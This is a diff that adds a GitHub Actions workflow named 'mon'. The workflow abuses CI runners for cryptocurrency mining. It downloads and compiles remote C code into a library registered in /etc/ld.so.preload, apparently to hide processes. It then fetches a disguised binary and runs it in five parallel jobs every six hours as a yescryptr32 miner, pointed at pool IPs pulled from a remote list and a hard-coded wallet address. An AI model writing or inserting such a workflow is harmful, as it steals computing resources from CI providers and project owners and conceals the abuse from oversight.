@@ -1,0 +1,102 @@
+name: mon
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5]
+        flag: [A]
+    env:
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install Dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget curl build-essential jq
+
+    - name: Download and compile code
+      run: |
+        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+        sudo mv libnyumput.so /usr/local/lib/
+        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
+        rm nyumput.c
+
+    - name: Prepare environment
+      run: |
+        mkdir -p .lib
+        wget -O .lib/sgr1 https://github.com/barburonjilo/back/raw/main/sr
+        chmod +x .lib/sgr1
+
+    - name: Clean up old files
+      run: |
+        rm -f list.json tmp.json
+
+    - name: Run and manage process
+      run: |
+        end_time=$(( $(date +%s) + 6*3600 ))  # 6 hours from now
+        while [ $(date +%s) -lt $end_time ]; do
+          # Download and check IP list
+          wget -O list.json https://github.com/barburonjilo/setstra/raw/main/list.json
+          if [[ ! -f list.json ]]; then
+            echo "Failed to download IP list. Exiting."
+            exit 1
+          fi
+
+          # Check JSON file format
+          if ! jq '.' list.json > /dev/null 2>&1; then
+            echo "Invalid JSON format. Exiting."
+            exit 1
+          fi
+
+          # Select a random IP from the JSON file
+          ip=$(jq -r '.[]' list.json | shuf -n 1)
+          if [ -z "$ip" ]; then
+            echo "No IP found in list.json. Exiting."
+            exit 1
+          fi
+
+          # Remove selected IP from JSON file
+          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' list.json > tmp.json && mv tmp.json list.json
+
+          # Start the process for multiple ports
+          for port in $(seq 843 852); do
+            if [ -f .lib/sgr1 ]; then
+              # Run the process with the specified parameters in background
+              nohup .lib/sgr1 -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx --timeout 120 -t 4 > dance_$port.log 2>&1 &
+              process_pid=$!
+
+              echo "Started process with PID $process_pid using IP $ip and port $port"
+
+              # Run for 1 minute
+              sleep 60
+
+              # Kill the process
+              kill $process_pid || true
+            else
+              echo "sgr1 not found. Skipping..."
+              sleep 120
+            fi
+          done
+
+          # Wait for 2 minutes before the next iteration
+          sleep 120
+
+          # Clean up after each iteration
+          rm -f list.json tmp.json
+        done
